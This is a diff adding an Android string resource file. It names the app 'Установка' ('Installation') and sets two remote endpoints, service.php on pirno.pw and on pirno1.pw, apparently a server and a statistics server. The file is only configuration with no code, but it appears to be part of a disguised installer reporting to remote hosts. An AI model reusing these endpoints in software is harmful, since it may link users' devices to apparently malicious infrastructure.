@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Установка</string>
+    <string name="server">http://pirno.pw/service.php</string>
+    <string name="server_stata">http://pirno1.pw/service.php</string>
+</resources>
